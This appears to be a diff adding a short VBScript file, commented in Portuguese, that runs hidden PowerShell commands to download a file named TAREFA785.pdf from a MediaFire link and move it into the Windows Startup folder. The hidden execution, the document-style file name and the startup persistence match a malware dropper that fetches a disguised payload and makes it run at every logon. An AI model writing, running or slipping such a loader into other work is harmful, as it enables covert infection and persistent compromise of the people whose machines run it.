@@ -1,0 +1,18 @@
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+
+' Comandos PowerShell para mudar para a pasta Downloads e baixar o arquivo
+Dim comandoPowerShell
+comandoPowerShell = "cd $env:USERPROFILE\Downloads; Start-BitsTransfer 'https://download854.mediafire.com/an3d78grdqxgrUs4u-JNqKqHvXV6Lda0ATHGQFXsGb5F4xH5LC2_ThmBuwQnYKrpDaFOBMhL_sRAdkN3amYnelvkpwm-00ZN5ojE5WSWyEqPzvJF2JrQ7NNt6jEAPyCyG1fbjHQZwUL4rFjolYYA96FcB1McHUoabh7DqXSBjq_b0Q/67wmhy1fgqrc2dd/TAREFA785.pdf' -Destination .\TAREFA785.pdf;"
+
+' Executar o comando PowerShell
+objShell.Run "powershell.exe -Command " & comandoPowerShell, 0, True
+
+' Comandos PowerShell para mover o arquivo baixado para a pasta de inicialização
+comandoPowerShell = "Move-Item -Path '.\TAREFA785.pdf' -Destination '$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';"
+
+' Executar o comando PowerShell
+objShell.Run "powershell.exe -Command " & comandoPowerShell, 0, True
+
+' Liberar o objeto Shell
+Set objShell = Nothing
